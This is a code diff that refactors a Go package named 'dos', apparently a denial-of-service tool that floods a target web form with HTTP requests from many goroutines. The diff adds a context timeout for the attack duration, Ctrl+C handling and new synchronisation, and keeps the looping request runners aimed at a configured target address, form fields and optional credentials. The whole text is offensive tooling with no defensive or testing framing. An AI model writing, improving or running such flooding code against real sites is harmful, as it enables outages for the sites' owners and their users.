@@ -3,19 +3,17 @@
 package dos
 
 import (
-	"fmt"
+	"context"
 	"log"
 	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
+	"os/signal"
 	"strings"
+	"syscall"
 	"time"
 )
-
-type ch struct {
-	done chan struct{}
-	sync chan int
-}
 
 // TargetInf - struct for webaddress and formnames
 type TargetInf struct {
@@ -27,7 +25,6 @@ type TargetInf struct {
 }
 
 var (
-	globalCh         ch
 	infoIntern       TargetInf
 	authUser         string
 	authPass         string
@@ -109,12 +106,12 @@ func makeRequest(done chan<- struct{}) {
 	close(done)   // sending empty data to done channel
 }
 
-func runner(start <-chan struct{}) {
+func runner(ctx context.Context, start <-chan struct{}) {
 	<-start // Starting routine on close of channel starter
 
 	for {
 		select {
-		case <-globalCh.done: // Quit routine on receive
+		case <-ctx.Done(): // Quit routine on receive
 			return // Close runner goroutine
 		default:
 			func() {
@@ -126,31 +123,22 @@ func runner(start <-chan struct{}) {
 	}
 }
 
-func start(n int) {
+func start(ctx context.Context, done chan<- struct{}, threadN int) {
 	start := make(chan struct{})
 
-	for i := 1; i < n+1; i++ {
+	for i := 1; i < threadN+1; i++ {
 		log.Printf("Starting routine: %d\n", i)
-		go runner(start)
+		go runner(ctx, start)
 	}
 
-	// Building initial request
+	// Build initial request
 	log.Println("Building Initial Request")
-	done := make(chan *http.Request) // create channel done
-	go buildRequest(done)            // Building initial request
-	_ = <-done                       // Wait for initial request to be done
-	defer close(done)                // close channel done
-
+	result := make(chan *http.Request) // create channel done
+	go buildRequest(result)            // Building initial request
+	_ = <-result                       // Wait for initial request to be done                  // close channel done
+	close(result)
 	close(start) // close channel starter to start runner routines
-	status := 0
-	globalCh.sync <- status
-}
-
-func done() {
-	close(globalCh.done)
-	time.Sleep(5 * time.Second)
-	status := 0
-	globalCh.sync <- status
+	close(done)  // synchronise and unlock sync in parent function
 }
 
 func buildRequest(result chan<- *http.Request) {
@@ -180,9 +168,6 @@ func buildRequest(result chan<- *http.Request) {
 }
 
 func buildingDataAndCh(info *TargetInf) {
-	globalCh.done = make(chan struct{})
-	globalCh.sync = make(chan int)
-
 	infoIntern = info.Copy() // Build global struct
 
 	if infoIntern.authSet {
@@ -192,30 +177,25 @@ func buildingDataAndCh(info *TargetInf) {
 }
 
 // Dos - start Dos and returns error or nil
-func Dos(threads int, timeInSeconds int, info *TargetInf) (err error) {
-	var status int            // Status variable for error management
-	var runTime time.Duration // variable for runtime management
+func Dos(threads int, timeInSeconds int, info *TargetInf, done chan<- struct{}) {
+	dostime := time.Duration(timeInSeconds) * time.Second
+	ctx, cancel := context.WithTimeout(context.Background(), dostime)
 
-	runTime = 8 * time.Second
+	// catch SIGINT (CTRL+C)
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		log.Printf("\nyou pressed ctrl+c\n")
+		cancel()
+	}()
 
 	buildingDataAndCh(info) // build the datastructure from TargetInf struct and initialize channels
 
-	go start(threads)        // start routines
-	status = <-globalCh.sync // Wait for start routine
-	if status < 0 {
-		err = fmt.Errorf("error in start() routine of package formdos")
-		return err
-	}
+	sync := make(chan struct{})
+	go start(ctx, sync, threads) // start routines
+	<-sync                       // wait for start routine
 
-	time.Sleep(runTime) // Let the routines work for the given duration
-
-	go done()                // quit routines
-	status = <-globalCh.sync // Wait for quit routine
-	if status < 0 {
-		err = fmt.Errorf("error in quit() routine of package formdos")
-		return err
-	}
-
-	return nil
-
+	<-ctx.Done() // wait for contex done
+	close(done)
 }
